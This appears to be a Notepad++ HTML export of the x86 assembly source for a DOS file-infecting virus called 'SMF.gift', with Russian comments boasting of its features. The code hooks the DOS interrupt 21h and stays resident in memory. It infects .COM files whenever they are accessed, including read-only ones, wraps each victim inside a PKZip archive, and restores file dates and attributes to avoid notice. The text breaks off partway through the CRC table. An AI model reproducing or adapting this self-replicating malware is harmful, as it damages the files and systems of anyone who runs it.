<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; ===================== SMF.gift by SMT //SMF ==============================</span><span class="sc0">
</span><span class="sc1">; I am sorry for 386 code :(</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; +COM-резидент-неполиморф :(, поражает com-файлы при любом доступе к ним</span><span class="sc0">
</span><span class="sc1">;   (поражает файл, с которым работает DOS) из под DOS/NC/VC,</span><span class="sc0">
</span><span class="sc1">;   в т.ч. и через FindNext(Просмотр каталога в VolcovCommander)</span><span class="sc0">
</span><span class="sc1">; +Расползается оч-чень быстро :( особенно по моей тачке :)</span><span class="sc0">
</span><span class="sc1">; -Не поражает из-под FAR'a ввиду его 32-bit обращения к файлам (но резидент</span><span class="sc0">
</span><span class="sc1">;   устанавливается, и при запуске DOS-утилит файлы поражаются)</span><span class="sc0">
</span><span class="sc1">; +Заражает Read-Only (файлы,не диски:), сохраняет атрибуты,дату/время создания</span><span class="sc0">
</span><span class="sc1">; +Преобразует файлы в стандартный PkZip-архив,внутри которого</span><span class="sc0">
</span><span class="sc1">;   находится собственно жертва :))))</span><span class="sc0">
</span><span class="sc1">; +Проверка на exe-файлы в com-формате</span><span class="sc0">
</span><span class="sc1">; +Присутствует даже проверка на повторное заражение!</span><span class="sc0">
</span><span class="sc1">; +При своих многочисленных функциях и наворотах занимает всего-то несколько</span><span class="sc0">
</span><span class="sc1">;   килобайт.</span><span class="sc0">
</span><span class="sc1">; +CRC уже подсчитывается</span><span class="sc0">
</span><span class="sc1">; -Под ZipMagic95/98 совсем не работает (что и следовало ожидать)</span><span class="sc0">

</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">tiny</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">
</span><span class="sc2">.386</span><span class="sc0">
        </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">0fff0h</span><span class="sc0">
</span><span class="sc5">High1</span><span class="sc0">   </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc1">; maximal com-file</span><span class="sc0">
        </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
</span><span class="sc5">Start</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">04034b50h</span><span class="sc0">    </span><span class="sc1">; PKZIP file record</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">RealStart</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">266ah</span><span class="sc0">
</span><span class="sc5">crc1</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">CRC</span><span class="sc0">  </span><span class="sc1">; crc?</span><span class="sc0">
</span><span class="sc5">len1</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">viclen</span><span class="sc0">
</span><span class="sc5">len2</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">viclen</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0ch</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc5">virlen</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SMF_Gift.com'</span><span class="sc0">
</span><span class="sc5">RealStart</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0"> </span><span class="sc1">; restore results of dummy code in PK-header</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0"> </span><span class="sc1">; restore results of dummy code in PK-header</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">  </span><span class="sc1">; restore results of dummy code in PK-header</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'GIFT'</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0"> </span><span class="sc1">; check if we are already resident</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'DONE'</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">VcStart</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; get segment of MCB</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">3</span><span class="sc4">],(</span><span class="sc2">65536</span><span class="sc4">-</span><span class="sc2">100h</span><span class="sc4">)/</span><span class="sc2">16</span><span class="sc0">     </span><span class="sc1">; allocate 64K for virus :)</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; calculate segment address for TSR</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">      </span><span class="sc1">; dx=segment of TSR, addressable by offset 100h</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Intr21</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">84h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; addr. of int21 vector</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Old21</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">virend</span><span class="sc4">-</span><span class="sc5">Start</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc5">VcStart</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Victim</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">High1</span><span class="sc4">-</span><span class="sc5">Victim</span><span class="sc0">     </span><span class="sc1">; maximum possible victim length</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0c3a4f3h</span><span class="sc0">        </span><span class="sc1">; opcodes for "rep movsb,retn"</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0fch</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0fch</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">    </span><span class="sc1">; run victim's code</span><span class="sc0">

</span><span class="sc1">; ================ NEW int21 handler =======================</span><span class="sc0">
</span><span class="sc5">Intr21</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'GIFT'</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">noCheck</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'DONE'</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">
</span><span class="sc5">noCheck</span><span class="sc4">:</span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2fh</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">skip</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2fh</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0"> </span><span class="sc1">; get search record(DTA) to es:bx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">old_size</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; get date/size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old_size</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc1">; this trick only to minimize suspicious disk access:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">     </span><span class="sc1">; if date/time changed from last search, then</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">skip</span><span class="sc0"> </span><span class="sc1">; it is another file - let's check it</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1eh</span><span class="sc0">
</span><span class="sc5">scan</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">scan</span><span class="sc0">        </span><span class="sc1">; search for end of file name</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc12">'MOC.'</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">skip</span><span class="sc0">        </span><span class="sc1">; check for com-file</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">1ah</span><span class="sc4">],</span><span class="sc2">0fff0h</span><span class="sc4">-</span><span class="sc5">virlen</span><span class="sc4">-</span><span class="sc5">dirlen</span><span class="sc0">   </span><span class="sc1">; check file size</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">skip</span><span class="sc0">        </span><span class="sc1">; don't infect long com-files</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">1eh</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">         </span><span class="sc1">; reset file attributes (for infecting R/O)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d02h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0"> </span><span class="sc1">; open file for Read/Write</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Victim</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0"> </span><span class="sc1">; read file</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Victim</span><span class="sc4">],</span><span class="sc12">'M'</span><span class="sc4">+</span><span class="sc2">100h</span><span class="sc4">*</span><span class="sc12">'Z'</span><span class="sc0"> </span><span class="sc1">; check for .exe</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">close</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Victim</span><span class="sc4">],</span><span class="sc2">04034b50h</span><span class="sc0"> </span><span class="sc1">; is it already zip-file ?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">close</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc5">seed</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0debb20e3h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">0ffffffffh</span><span class="sc0">      </span><span class="sc1">;seed</span><span class="sc0">
</span><span class="sc5">crloop</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">crctab</span><span class="sc4">+</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">crloop</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">0ffffffffh</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">crc1</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">crc2</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">len1</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; set archived file length in zip-directories</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">len2</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">len3</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">len4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">virlen1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">vSize</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ZipDir</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Victim</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">dirlen</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">       </span><span class="sc1">; append zip-directory to end of archive</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; (it is located at the end of file)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0"> </span><span class="sc1">; seek to begin of file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0"> </span><span class="sc1">; write to file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0"> </span><span class="sc1">; restore original file time/date</span><span class="sc0">
</span><span class="sc5">close</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">1eh</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">         </span><span class="sc1">; restore old file attributes</span><span class="sc0">
</span><span class="sc5">skip</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Old21</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">Old21</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">crctab</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">000000000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">077073096h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ee0e612ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0990951bah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0076dc419h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0706af48fh</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0e963a535h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">09e6495a3h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00edb8832h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">079dcb8a4h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e0d5e91eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">097d2d988h</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">009b64c2bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07eb17cbdh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e7b82d07h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">090bf1d91h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01db71064h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06ab020f2h</span><span class="sc0">
